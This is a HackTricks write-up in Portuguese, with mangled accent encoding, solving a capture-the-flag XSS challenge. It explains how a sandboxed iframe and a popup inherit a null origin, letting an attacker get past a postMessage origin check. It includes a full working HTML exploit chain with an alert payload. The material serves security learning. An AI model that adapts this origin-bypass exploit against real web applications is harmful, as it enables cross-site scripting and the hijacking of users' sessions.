# Bypassando SOP com Iframes - 1

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de ciberseguranÃ§a**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Iframes em SOP-1

Neste [**desafio**](https://github.com/terjanq/same-origin-xss) criado por [**NDevTK**](https://github.com/NDevTK) e [**Terjanq**](https://github.com/terjanq), vocÃª precisa explorar um XSS no cÃ³digo.
```javascript
const identifier = '4a600cd2d4f9aa1cfb5aa786';
onmessage = e => {
  const data = e.data;
  if (e.origin !== window.origin && data.identifier !== identifier) return;
  if (data.type === 'render') {
    renderContainer.innerHTML = data.body;
  }
}
```
O principal problema Ã© que a [**pÃ¡gina principal**](https://so-xss.terjanq.me) usa o DomPurify para enviar o `data.body`, entÃ£o, para enviar seus prÃ³prios dados html para esse cÃ³digo, vocÃª precisa **burlar** `e.origin !== window.origin`.

Vamos ver a soluÃ§Ã£o que eles propÃµem.

### Burlando SOP 1 (e.origin === null)

Quando `//example.org` Ã© incorporado em um **iframe com sandbox**, a **origem** da pÃ¡gina serÃ¡ **`null`**, ou seja, **`window.origin === null`**. EntÃ£o, apenas incorporando o iframe via `<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">` poderÃ­amos **forÃ§ar a origem `null`**.

Se a pÃ¡gina fosse **incorporÃ¡vel**, vocÃª poderia burlar essa proteÃ§Ã£o dessa maneira (os cookies tambÃ©m podem precisar ser definidos como `SameSite=None`).

### Burlando SOP 2 (window.origin === null)

O fato menos conhecido Ã© que, quando o valor do **sandbox `allow-popups` Ã© definido**, a **popup aberta** herdarÃ¡ todos os **atributos com sandbox** a menos que `allow-popups-to-escape-sandbox` seja definido.\
Portanto, abrir uma **popup** de uma **origem nula** farÃ¡ com que o **`window.origin`** dentro da popup tambÃ©m seja **`null`**.

### SoluÃ§Ã£o do desafio

Portanto, para este desafio, pode-se **criar** um **iframe**, **abrir uma popup** para a pÃ¡gina com o manipulador de cÃ³digo XSS vulnerÃ¡vel (`/iframe.php`), como `window.origin === e.origin` porque ambos sÃ£o `null`, Ã© possÃ­vel **enviar um payload que irÃ¡ explorar o XSS**.

Esse **payload** obterÃ¡ o **identificador** e enviarÃ¡ um **XSS** de volta para a **pÃ¡gina superior** (a pÃ¡gina que abriu a popup), **que** mudarÃ¡ de **localizaÃ§Ã£o** para o **vulnerÃ¡vel** `/iframe.php`. Como o identificador Ã© conhecido, nÃ£o importa que a condiÃ§Ã£o `window.origin === e.origin` nÃ£o seja satisfeita (lembre-se, a origem Ã© a **popup** do iframe que tem **origem** **`null`**) porque `data.identifier === identifier`. EntÃ£o, o **XSS serÃ¡ acionado novamente**, desta vez na origem correta.
```html
<body>
  <script>
    f = document.createElement('iframe');
    
    // Needed flags
    f.sandbox = 'allow-scripts allow-popups allow-top-navigation';
    
    // Second communication with /iframe.php (this is the top page relocated)
    // This will execute the alert in the correct origin
    const payload = `x=opener.top;opener.postMessage(1,'*');setTimeout(()=>{
      x.postMessage({type:'render',identifier,body:'<img/src/onerror=alert(localStorage.html)>'},'*');
    },1000);`.replaceAll('\n',' ');
   
   // Initial communication
   // Open /iframe.php in a popup, both iframes and popup will have "null" as origin
   // Then, bypass window.origin === e.origin to steal the identifier and communicate
   // with the top with the second XSS payload
    f.srcdoc = `
    <h1>Click me!</h1>
    <script>
      onclick = e => {
        let w = open('https://so-xss.terjanq.me/iframe.php');
        onmessage = e => top.location = 'https://so-xss.terjanq.me/iframe.php';
        setTimeout(_ => {
          w.postMessage({type: "render", body: "<audio/src/onerror=\\"${payload}\\">"}, '*')
        }, 1000);
      };
    <\/script>
    `
    document.body.appendChild(f);
  </script>
</body>
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
